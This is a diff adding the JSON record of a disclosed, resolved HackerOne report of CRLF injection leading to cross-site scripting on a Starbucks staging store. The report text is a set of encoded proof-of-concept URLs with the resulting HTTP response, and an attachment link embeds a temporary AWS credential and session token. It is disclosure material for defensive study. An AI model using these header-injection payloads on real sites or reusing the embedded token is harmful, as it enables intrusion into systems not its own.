@@ -1,0 +1,133 @@
+{
+  "id": 192667,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTI2Njc=",
+  "url": "https://hackerone.com/reports/192667",
+  "title": "[stagecafrstore.starbucks.com] CRLF Injection, XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-20T08:42:53.161Z",
+  "submitted_at": "2016-12-20T08:42:53.161Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bobrov",
+    "url": "/bobrov",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1989,
+    "url": "https://hackerone.com/starbucks",
+    "handle": "starbucks",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Starbucks",
+      "twitter_handle": "Starbucks",
+      "website": "http://www.starbucks.com",
+      "about": "Premier purveyor of the finest coffee in the world, inspiring and nurturing the human spirit — one person, one cup and one neighborhood at a time."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-01-22T22:31:42.805Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-12-29T07:43:00.118Z",
+  "team_member_agreed_on_going_public_at": "2018-01-22T22:31:42.739Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Chrome PoC**\n```\nhttp://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n```\n\n**FireFox PoC**\n```\nhttp://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E\n```\n\n**HTTP Response**\n```http\nHTTP/1.1 301 Content-moved\nDate: Tue, 20 Dec 2016 08:40:11 GMT\nServer: WebServer\nX-Original-link: /%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E\nX-XSS-Protection: 0\nLocation: //x:1\nContent-Type: text/html\nContent-Length: 98\n\n<script>alert(document.domain)</script>\nContent-Length: 0\nX-OneLinkServiceType: onelink.fcgi\n```",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 145308,
+      "file_name": "Screenshot_at_12-42-40.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/145/308/9ee17fecda8b2c4000944f6d16410351e98d9b2c/Screenshot_at_12-42-40.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_at_12-42-40.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_at_12-42-40.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7R3Z7EMO%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T025444Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDdYdcUzJ7EtNSXHGrCTHURz6YGyVfcbWmCgLhGN3RzgwIgLA5V75%2FCsjjiasb5t8uwEm6Gofs6aOhta7HDD4YRARoqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDGcRrbQTN%2F9oCVgz2iqOBU1lcbD5ANeSeYRykFn1%2F77e7XQrKNpX%2BqxquMYVcjzD5KYR0fmfyylh8uQE3sACBBhCSlrHcf5W6AyhqMOtOHPjp3%2BeVFxo2SBtIcjB327KttOg4r2eM9Xojcy3id6qwWaA3ZZf2mGVXN6ocG5vxAFzv62%2BsFdMOTAhAMJiXL8vkMN%2F7xeYoZHY15igeqNA%2BxKLxI61NPDtH6uFOT25xM6L3Lvyyrb0JaRWmFVxSISUW8a97TDBD4ZXml8QuD7Oam7YsNYY7yGJztcBTPdiKRxnZsaB7LVLVMfeWE6s6iNEXBtcvI2vqEYgdSEoZ3ObKWZ1NENtWcu1ItBERzsqGz8UWhO5rkecYId1UTybhuYPPaAKVL501dqgEBGTIy%2BEtpjKenv2cwjKY0NUC3Yr6JZdPn7PNm3dYaZ8AUXio%2FzaF5TiNi74rGPgnx62uKWQYewpW%2F8DQgHbAEFLKFAYFhTSKu7wPrQmVTGM1seEq86mciftI36rGGLl3ZWX4Qt1SB%2FrKYeqJ8%2FFC9pWtLHleSo19y4E8Mq3UDrkeg2rDA2pFVnwXN8aaESvzTMrU1%2FOO90MD%2FR4CFNH%2Ff%2Fzc1ta08Ce6FcsXJcGHLGE07UpPQ0jgs5xXYH8y2cMT2d2i%2BRL3Cdb9oYSL%2F6UOZ%2BajIAE6aQ%2FLRmlZbb4AwdN1xuWfu8aoQKGCDewV29HD7jajoPOKgsLQVXN7zkXfRithKIMiXUBi2yShHYupn7kMBDQd6NT5NZU2G896dyQA4o%2BnotD0e6g9UY6xgxULsA2yuXLGgGKKj%2F0EoTfkcEKa8ZYJpTTL4sI%2BUoVDuMYtM78aG6S4c5UuR9phOUKk5mccOydLzKoFnIZeHMroEVwSaHDlDCli%2BTMBjqxAcoUnveMvBTuXdbcGH3Wbb01mnr1n%2Ff9G%2FdsdxnQKPl73M5NW7VxLX3gwC1NY2EiPmoc9aJFVopL1h6jK3Mj44CRq4ZwoEe3qmQFcNf3qhcDEs99CXZFOvdCy09PhXuIVkRZ9PD4rAEG%2F%2BVT2MCE7PRbNVu%2Fxrr60KTFncd1bBufas93sI5sULdNVq1%2FiMfZOBGAtN60zr9RuEnFf34MRWmUw0xLTUgHS%2BNs5zffQ2pkUg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=072784161847f4ada7c3b2c9d831901412dfb0af6856dab73710893a43b1cb7e",
+      "file_size": 37818,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-28T07:43:00.193Z",
+  "allow_singular_disclosure_after": -254517104.6941732,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "jokebookservice1",
+    "defenderwww",
+    "sp1d3rs",
+    "mzfr",
+    "muon4",
+    "bobrov",
+    "bl4de",
+    "fizhimchik",
+    "0xsheet",
+    "bobo_ka",
+    "and 17 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 12995,
+    "asset_type": "OTHER",
+    "asset_identifier": "Other assets",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
